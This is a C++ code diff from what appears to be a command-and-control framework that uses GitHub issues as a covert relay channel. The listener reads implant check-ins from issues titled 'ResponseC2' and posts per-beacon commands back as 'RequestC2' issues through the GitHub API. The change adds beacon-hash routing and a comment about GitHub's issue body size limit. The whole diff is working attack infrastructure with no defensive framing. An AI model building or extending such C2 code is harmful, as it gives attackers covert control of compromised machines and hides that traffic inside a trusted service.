@@ -70,21 +70,39 @@ void ListenerGithub::checkGithubIssues()
 				DEBUG("[+] handle issue: " << std::to_string(number));
 
 				if(title.rfind("ResponseC2: ", 0) == 0)
-				{
+				{	
+					std::string marker = "ResponseC2: ";
+					std::size_t pos = title.find(marker);
+					if (pos == std::string::npos) 
+					{
+						continue;
+					}
+					pos += marker.length();
+					std::string beaconHash = title.substr(pos);
+
 					std::string res;
 					HandleCheckIn(body, res);
 
 					// generate the response for response who got content 
 					if(res.size()>4)
 					{
+						std::string reponseTitle = "RequestC2: ";   
+						reponseTitle+=beaconHash;
+
 						json responseData = {
-							{"title", "RequestC2: toto"},
+							{"title", reponseTitle},
 							{"body", res},
 							};
 
 						std::string data = responseData.dump();
 						std::string contentType = "application/json";
 						auto response = cli.Post(endpoint, headers, data, contentType);
+
+						// TODO
+						// std::cout << "!!! !!!! response " << response->body << std::endl;
+						// {"message":"Validation Failed","errors":[{"resource":"Issue","code":"custom","field":"body","message":"body is too long"},
+						  // {"resource":"Issue","code":"custom","field":"body","message":"body is too long (maximum is 65536 characters)"}],
+						  // "documentation_url":"https://docs.github.com/rest/issues/issues#create-an-issue"}
 
 						if(response->status!=200)
 						{
